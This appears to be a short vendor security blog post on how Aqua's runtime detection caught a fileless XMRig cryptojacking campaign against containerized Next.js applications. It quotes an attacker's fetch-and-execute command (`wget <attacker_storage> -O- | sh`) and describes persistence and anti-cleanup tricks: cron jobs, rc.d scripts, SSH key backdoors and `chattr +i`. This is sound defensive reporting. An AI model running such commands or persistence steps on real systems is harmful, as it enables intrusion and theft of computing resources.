---
title: How Aqua Detected a Cryptomining Attack in Memory
date: 2026-08-04
categories: [CYBERSECURITY]
tags: [CRYPTOMINING,AQUA,SECURITY,MALWARE]
---

## How Aqua Detected a Cryptomining Attack in Memory

Aqua's runtime behavioral detection engine surfaced a multistage fileless XMRig cryptojacking campaign affecting containerized Node.js applications built with Next.js (React). The available telemetry showed malicious code executing through Node.js processes, but it did not provide enough evidence to identify the exact exploit used. Every observed stage of the campaign was designed to avoid conventional tooling.

Execution began in memory through the Next.js exploit. The attacker then used `wget <attacker_storage> -O- | sh` to pull and run a first stage script directly from a remote location - nothing saved to disk. That script fetched a packed loader, which unpacked directly into memory (memfd:upX). This was the fileless-execution artifact Aqua's runtime detection keyed on before dropping the cryptominer to disk. This sequence reduced the attacker's reliance on a conventional executable during the early stages of the attack, limiting opportunities for file-based scanners to inspect the loader. Aqua's Block Fileless Execution policy targets this behavior by identifying execution from memfd: and /dev/shm/ paths.

Aqua observed hidden file execution along with guard and watchdog processes used to maintain the miner. Aqua's behavioral detection identified newly introduced binaries that were not present in the original image. The attacker established persistence through cron jobs, init scripts in rc.d, and shell profile modifications. The attacker also installed an SSH key as a backdoor on the compromised hosts. The miner and companion processes used names that resembled legitimate system services, but Aqua's process lineage tracking exposed the relationship between the web application process and the unexpected child processes. Aqua found no evidence that the attacker accessed customer secrets, tokens, or keys. In a later phase of the campaign, the attacker used `chattr +i` to set immutable flags on key files, preventing deletion even by processes running as root. This behavior shows that the attacker anticipated eventual discovery and attempted to make cleanup more difficult.

The XMRig miner communicated outbound to a known Monero mining pool over a standard port. Without process-level context, that traffic can be difficult to distinguish from legitimate application traffic. Aqua's Cryptomining Detection policy identified the mining behavior at the process and network level and associated the outbound connection with the exact process generating it.

[Read full article](https://www.aquasec.com/blog/how-did-aqua-catch-a-cryptomining-attack-hiding-in-memory/)